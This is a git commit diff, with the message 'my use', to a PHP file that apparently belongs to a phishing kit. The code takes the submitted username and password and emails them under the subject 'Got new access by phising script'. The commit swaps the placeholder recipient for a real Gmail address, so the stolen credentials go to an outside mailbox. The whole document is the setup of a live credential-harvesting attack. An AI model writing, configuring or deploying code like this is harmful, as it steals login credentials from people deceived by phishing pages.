91efc432a139908f3ebf0f1f675f925ac613d936
devilneverforgives <89150915+devilneverforgives@users.noreply.github.com>
2021-08-18 21:13:09 +0530

    my use

--- do_action.php
+++ do_action.php
@@ -8,7 +8,7 @@
 		$username = $_REQUEST['username'];
 		$password = $_REQUEST['password'];
 		
-		$reciever = "YOUR-EMAIL ADRRESS";
+		$reciever = "knowledge420baba@gmail.com";
 		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
